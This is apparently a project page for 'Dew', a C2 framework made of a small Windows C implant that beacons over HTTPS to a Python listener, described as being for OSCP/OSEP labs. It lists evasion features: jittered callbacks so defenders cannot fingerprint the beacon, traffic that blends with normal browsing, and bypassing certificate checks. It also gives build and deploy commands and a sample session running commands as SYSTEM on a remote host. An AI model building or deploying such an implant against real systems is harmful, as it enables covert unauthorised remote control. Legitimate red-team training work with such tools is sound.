Components

Two components: a tiny C implant that polls over HTTPS and a Python listener that queues commands and decrypts results.

⚡

Implant

~37 KB C binary with XChaCha20-Poly1305 AEAD over HTTPS. WinHTTP transport, jittered callbacks, piped command execution.

./build.sh 10.10.14.1 443
🖨

Listener

Python 3 HTTPS server with interactive prompt. Auto self-signed TLS certs. PyNaCl for matching XChaCha20-Poly1305 decrypt/encrypt.

python3 listener.py --lport 443 --key <psk>
🔒

Crypto

Vendored Monocypher extraction (~370 lines). XChaCha20-Poly1305 AEAD with 24-byte random nonces. No full crypto library needed.

monocypher.c + monocypher.h

Technical Features

Double encryption, minimal footprint, and zero dependencies. Built for OSCP/OSEP lab environments.

Double Encryption

HTTPS via WinHTTP for transport, plus XChaCha20-Poly1305 AEAD for command payloads. Two independent encryption layers with a pre-shared key.

XChaCha20-Poly1305

Vendored Monocypher extraction. 24-byte random nonces via RtlGenRandom. Wire format: [nonce(24)][mac(16)][ct]. Fresh nonce per message.

Jittered Callbacks

Centered jitter via RtlGenRandom. Sleeps between 70-130% of base interval. No predictable beacon pattern for defenders to fingerprint.

~37 KB Binary

Stripped and size-optimized with -Os -s. No runtime dependencies beyond native Windows DLLs (WinHTTP, advapi32). Cross-compiled from Linux with MinGW.

Piped Execution

CreateProcess with cmd.exe /c, anonymous pipe capture of stdout+stderr. 64 KB output cap with truncation notification.

Clean Shutdown

Reserved EXIT command for remote shutdown. Graceful cleanup with no orphaned processes or dangling HTTPS connections.

Auto TLS Certs

Listener auto-generates self-signed TLS certificates on first launch. Implant bypasses certificate validation for lab use.

System Proxy

WinHTTP respects system proxy settings. Traffic blends with normal HTTPS browsing on port 443.

Build Script

One command generates a random 256-bit PSK, cross-compiles the implant, and prints the exact listener command to run.

Architecture

Four-layer design. HTTPS transport wraps XChaCha20-Poly1305 encrypted command payloads.

1

WinHTTP Transport

Native Windows TLS via WinHttpOpen / WinHttpSendRequest. Proxy-aware. Self-signed cert bypass for lab use. Standard HTTPS on port 443.

2

XChaCha20-Poly1305

AEAD encryption via vendored Monocypher. Wire format: [nonce(24)][mac(16)][ct]. Fresh 24-byte random nonce per message via RtlGenRandom.

3

Beacon Protocol

POST /poll with encrypted beacon ID. POST /result with encrypted output. HTTP 200 = command queued, HTTP 204 = sleep.

4

Python Listener

HTTPS server with interactive prompt. Thread-safe command queue. PyNaCl for matching XChaCha20-Poly1305 decrypt/encrypt. Auto-generated TLS certs.

Getting Started

Build from source with MinGW-w64. One command generates everything.

build.sh 
# Clone and build
$ git clone https://github.com/Real-Fruit-Snacks/Dew.git
$ cd Dew

# Build with auto-generated PSK
$ ./build.sh 10.10.14.1 443
[*] Generated PSK: a1b2c3d4...
[*] Compiled dew.exe (37,888 bytes)

# Or with your own key
$ ./build.sh 10.10.14.1 443 <64-hex-chars>
deploy.sh 
# Start listener (operator machine)
$ python3 listener.py --lport 443 --key <psk>
[*] TLS cert generated
[*] Listening on 0.0.0.0:443
[+] Connection from 10.10.10.5

# Execute commands
dew> whoami
nt authority\system

dew> ipconfig
IPv4 Address: 10.10.10.5
